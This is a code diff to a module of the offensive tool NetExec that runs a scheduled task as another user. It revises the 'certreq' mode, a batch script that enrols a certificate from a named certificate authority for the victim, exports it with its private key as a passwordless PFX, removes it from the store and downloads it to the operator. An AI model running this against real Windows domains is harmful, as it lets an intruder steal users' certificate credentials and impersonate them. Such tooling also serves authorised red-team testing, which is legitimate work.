@@ -80,7 +80,10 @@ class NXCModule:
             self.logger.fail("You need to specify a USER to run the task as")
             return
 
-        if self.command_to_run.lower() == "certreq":
+        # certreq mode is decided from the original CMD here, because self.command_to_run is later
+        # reassigned to the batch path; the PFX download below is gated on this same flag
+        self.is_certreq = self.command_to_run.lower() == "certreq"
+        if self.is_certreq:
             if self.ca_name is None:
                 self.logger.fail("CertReq requires the CA name in the following format: SERVER_NAME\\CertificateAuthority_Name")
                 return
@@ -96,21 +99,18 @@ class NXCModule:
             setlocal enabledelayedexpansion
 
             set "BASE={full_path_prefixed_file}"
-            certreq -new "%BASE%.inf" "%BASE%.req" > nul
-            certreq -submit -config "{self.ca_name}" "%BASE%.req" "%BASE%.cer" > nul
-            certutil -user -addstore my "%BASE%.cer" > nul
-            set "HASH="
-            for /f "tokens=2 delims=:" %%A in ('
-                certutil -user -store my ^| findstr /r /c:"Hach\. cert\." /c:"Cert Hash"
-            ') do (
-                set "tmp=%%A"
-                set "tmp=!tmp: =!"
-                set "HASH=!tmp!"
-            )
+            certreq -new "%BASE%.inf" "%BASE%.req" > nul || exit /b 10
+            certreq -submit -config "{self.ca_name}" "%BASE%.req" "%BASE%.cer" > nul || exit /b 11
+            if not exist "%BASE%.cer" exit /b 12
 
-            if "!HASH!"=="" (
-                exit /b 1
-            )
+            rem Read the SHA1 thumbprint of the certificate we just enrolled, directly from its own file
+            rem (locale- and encoding-independent), so repairstore/exportPFX/delstore can only ever touch
+            rem that one certificate, never a pre-existing certificate in the user's store
+            set "HASH="
+            for /f "usebackq delims=" %%A in (`powershell -NoProfile -Command "(New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 '%BASE%.cer').Thumbprint"`) do set "HASH=%%A"
+            if "!HASH!"=="" exit /b 13
+
+            certutil -user -addstore my "%BASE%.cer" > nul || exit /b 14
             certutil -user -repairstore my !HASH! > nul 2>&1
             certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot > nul 2>&1
             certutil -user -delstore my !HASH! > nul 2>&1
@@ -212,7 +212,7 @@ class NXCModule:
                 except Exception as e:
                     self.logger.fail(f"Error deleting {self.output_file_location}{self.binary_to_upload_name} on {self.share}: {e}")
 
-            if self.ca_name and self.template_name:
+            if self.is_certreq:
                 dump_path = path.join(NXC_PATH, "modules/schtask_as")
                 if not path.isdir(dump_path):
                     makedirs(dump_path)
